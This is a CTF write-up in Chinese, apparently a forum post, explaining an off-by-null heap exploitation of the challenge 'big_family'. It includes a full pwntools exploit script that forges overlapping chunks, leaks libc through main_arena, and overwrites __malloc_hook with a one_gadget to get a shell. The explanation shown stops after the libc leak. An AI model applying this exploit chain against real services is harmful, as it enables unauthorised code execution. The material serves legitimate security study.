
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
proc="./family"
elf=ELF(proc)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
context.log_level="debug"

def Add(des_size, des):
    sh.recvuntil("Choice:")
    sh.sendline(str(1))
    sh.recvuntil("How big a house do you want to build?\n")
    sh.sendline(str(des_size))
    sh.recvuntil("How do you want to decorate your house?\n")
    sh.sendline(des)

def Delete(index):
    sh.recvuntil("Choice:")
    sh.sendline(str(2))
    sh.recvuntil("Which house do you want to remove?\n")
    sh.sendline(str(index))

def Show(index):
    sh.recvuntil("Choice:")
    sh.sendline(str(3))
    sh.recvuntil("Which house do you want to view?\n")
    sh.sendline(str(index))

def pwn(ip, port, debug):
    global sh
    if debug == 1:
        context.log_level = "debug"
        sh = process(proc)
    else:
        sh = remote(ip, port)
    Add(0x18, 'start')  #0
    Add(0x18, 'f')  #1
    Add(0x38, 'f')  #2
    Add(0x28, 'f')  #3
    Add(0x38, 'f')  #4
    Add(0x38, p64(8)*4 + p64(0x100) + p64(0x10))  #5
    Add(0x10, 'f')  #6
    for i in range(1, 6):
        Delete(i)
    sh.sendlineafter('Choice:', "1"*0x400)
    Delete(0)
    Add(0x18, 'a'*0x18)  #0
    Add(0x18, 'a')  #1
    Add(0x38, 'f')  #2
    Add(0x28, 'b')  #3
    Add(0x38, 'c')  #4
    Add(0x38, 'd')  #5
    Delete(1)
    Delete(2)
    sh.sendlineafter('Choice:', "1"*0x400)
    Delete(6)
    sh.sendlineafter('Choice:', "1"*0x400)
    Add(0x38, 'a')  #1
    Add(0x18, 'b')  #2
    Add(0x28, 'c')  #6
    Show(3)
    main_arena = u64(sh.recvuntil('\x7f').ljust(8, '\x00')) - 88
    libc_base = main_arena - 0x3c4b20
    free_hook = libc_base + libc.symbols['__free_hook']
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    realloc = libc_base + libc.symbols['__libc_realloc']
    one_gadget = libc_base + 0x4526a
    one_gadget_local = libc_base + 0x4527a
    log.info("libc_base: " + hex(libc_base))
    log.info("main_arena: " + hex(main_arena))
    log.info("free_hook: " + hex(free_hook))
    log.info("malloc_hook: " + hex(malloc_hook))
    Add(0x28, 'a')  #7-->3
    Add(0x38, 'b')  #8-->4
    Add(0x38, 'c')  #9
    Add(0x28, 'd')  #10
    Add(0x47, p64(0x41))  #11
    Add(0x47, p64(0x41))  #12
    Delete(11)
    Delete(12)
    Add(0x47, p64(0x41))
    Delete(3)
    Delete(10)
    Delete(7)
    Add(0x28, p64(0x41)*2)
    Add(0x28, 'f0und')
    Add(0x28, p64(0x41)*2)
    Delete(8)
    Delete(9)
    Delete(4)
    Add(0x38, p64(main_arena+8))
    Add(0x38, p64(main_arena+8))
    Add(0x38, p64(main_arena+8))
    Add(0x38, p64(main_arena+48) + p64(0)*3 + p64(0x41))
    Add(0x38, p64(0)*3 + p64(malloc_hook-0x18))
    #Add(0x38, p64(one_gadget)*2 + p64(realloc+13))
    #getshell local
    Add(0x38, p64(one_gadget_local) + p64(realloc+13))
    sh.recvuntil("Choice:")
    sh.sendline('1')
    sh.recvuntil("How big a house do you want to build?\n")
    sh.sendline('2')
    sh.interactive()

if __name__ == "__main__":
    pwn("111.231.70.44", 28006, 1)
```

# PWN (Off by null)

## 0x00 前置知识

- [`malloc_consolidate()`](<https://bbs.kanxue.com/elink@658K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8W2m8D9N6i4y4Q4y4h3k6d9c8g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3y4K6V1J5y4U0f1^5x3o6f1>.)

    > 使用 `scanf()` 获取内容时，如果输入字符串比较长会调用 `malloc()` 来分配内存。
    >
    > 在 `malloc()` 分配内存时，首先会依次扫描一遍 `fastbin`、`smallbin`、`unsorted bin`、`largebin`，如果都找不到可以分配的 `chunk` 分配给用户，会进入 `top_chunk` 分配的流程。如果此时还有 `fastbin`，就会触发堆合并机制，把 `fastbin` 合并之后放入 `smallbin`，再看能否分配；不能的话会使用 `top_chunk` 进行分配。

- `main_arena` attack

    > 当我们申请不到 `free_hook`、`malloc_hook` 上方的位置时，我们可以将堆块申请到 `main_arena`，然后覆盖 `top chunk` 为 hook 函数上方的位置，完成利用。

## 0x10 漏洞分析

本次使用的例题是ctfshow大吉大利杯的一道堆题，`big_family`。

正常检查保护后发现保护全开，在`read_n()`函数里面发现一个`Off by null`。

我们看`Add()`函数。

```c
void __cdecl read_n(char *buf, size_t len)
{
  char ch_0; // [rsp+13h] [rbp-Dh]
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i < len; ++i )
  {
    ch_0 = 0;
    if ( read(0, &ch_0, 1uLL) < 0 )
    {
      puts("Read error!!\n");
      exit(1);
    }
    buf[i] = ch_0;
    if ( ch_0 == 10 )
      break;
  }
  buf[i] = 0; // 固定向后面添加一个'\x00'字符
}
```

```c
void __cdecl buildhouse()
{
  int size; // [rsp+8h] [rbp-18h]
  int i; // [rsp+Ch] [rbp-14h]
  char *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  buf = 0LL;
  for ( i = 0; ; ++i )
  {
    if ( i > 15 )
    {
      puts("You can't build a house anymore!");
      return;
    }
    if ( !house[i] )
      break;
  }
  puts("How big a house do you want to build?");
  if ( (unsigned int)_isoc99_scanf("%u", &size) == -1 )
    exit(-1);
  if ( size <= 0 || size > 0x47 ) // fastbin
  {
    puts("Your house is not the right size");
    exit(-1);
  }
  buf = (char *)malloc(size);
  if ( !buf )
  {
    puts("Something wrong in building !!");
    exit(-1);
  }
  house[i] = buf;
  puts("How do you want to decorate your house?");
  read_n(house[i], size);
  puts("Done,your house is completed!");
}
```

在`Add()`函数中我们发现我们可以申请的`size`最大只有0x47大小，也就是最大0x50大小的堆块。

`Show()`函数以及`Delete()`函数没太大问题。

## 0x20 漏洞利用

由于我们可以申请的堆块大小被限制到了只能被`free`到`fastbin`里，而我们又要泄漏`libc`基地址，因此我们只能通过`scanf()`会调用`malloc()`分配内存的办法来使堆块合并。

```python
Add(0x18,'start')#0
Add(0x18,'f')#1
Add(0x38,'f')#2
Add(0x28,'f')#3
Add(0x38,'f')#4
Add(0x38,'a'*0x20+p64(0x100)+p64(0x10))#5
Add(0x10,'f')#6
```

首先我们可以申请出6个堆块，我们要通过第一个堆块来利用`Off by null`修改合并后的`smallbin`的`size`，以及第6个堆块来防止前面堆块与`top_chunk`发生合并，而由于是`Off by null`，我们要让`chunk1-5`的`size`相加等于0x110，然后覆盖为0x100来构造堆块重叠。

现在的堆结构是这样的：

![image-20210125214838786](https://bbs.kanxue.com/./upload/attach/202104/923114_FFKJ8UE6SYSQ952.png)

```python
for i in range(1,6):
    Delete(i)
sh.sendlineafter('Choice:',"1"*0x400)
Delete(0)
Add(0x18,'a'*0x18)#0
```

构造`samllbin`并且修改`smallbin`的`size`为0x100。

![image-20210125215952827](https://bbs.kanxue.com/./upload/attach/202104/923114_EPR9X4ZHHQ8ZS2U.png)

```python
Add(0x18,'a')#1
Add(0x28,'f')#2
Add(0x38,'b')#3
Add(0x38,'c')#4
Add(0x38,'d')#5
```

将`smallbin`分割成5个大小相加为0x100大小的块，此时堆块情况：

![image-20210301153218829](https://bbs.kanxue.com/./upload/attach/202104/923114_6E54T3SJXWGBS9N.png)

然后通过向`scanf()`输入0x400个1来触发`malloc_consolidate()`，使其刚好留出0x10大小的空间便于我们利用。

```python
Delete(1)
Delete(2)
```

之后我们删除1、2号块，用于我们接下来利用`off by null`对二号块的`size`位进行覆盖的操作。

```python
sh.sendlineafter('Choice:',"1"*0x400)
Delete(6)
sh.sendlineafter('Choice:',"1"*0x400)
```

删除1、2号块后，我们需要利用`malloc_consolidate()`，把删除的1、2号块合并进入`smallbin`，之后删除6号块，在触发一次`malloc_consoildate()`，使其向前合并。

![image-20210301160304233](https://bbs.kanxue.com/./upload/attach/202104/923114_QGKRVRURRNGGXH9.png)

向前合并之后，我们可以发现我们得到了一个包含没有被`free`过的一个0x130的空闲堆块，也就是说我们可以通过这个堆块来制造堆块重叠了。

```python
Add(0x38,'a')#1
Add(0x18,'b')#2
Add(0x28,'c')#6
```

我们将1、2、6号堆块申请回来，同时设置好`size`，就可以覆盖3号堆块，或者其他堆块的内容为`main_arena+88`，然后通过`show()`函数就可以泄漏`libc`了。
